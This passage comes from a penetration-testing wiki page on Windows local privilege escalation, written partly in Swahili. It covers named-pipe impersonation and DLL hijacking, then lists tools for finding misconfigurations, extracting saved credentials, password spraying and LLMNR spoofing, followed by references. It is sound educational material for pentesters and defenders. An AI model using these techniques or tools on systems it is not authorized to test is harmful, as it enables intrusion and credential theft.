Ukihitaji [**kujifunza zaidi kuhusu name pipes unapaswa kusoma hii**](#named-pipe-client-impersonation).\
Ukihitaji kusoma mfano wa [**jinsi ya kutoka high integrity kwenda System kwa kutumia name pipes unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuhijack dll** inayokuwa **loaded** na **process** inayoendesha kama **SYSTEM** utaweza kuendesha code yoyote kwa permissions hizo. Hivyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi ya hapo, ni **rahisi zaidi kufanikisha kutoka high integrity process** kwa kuwa itakuwa na **write permissions** kwenye folders zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
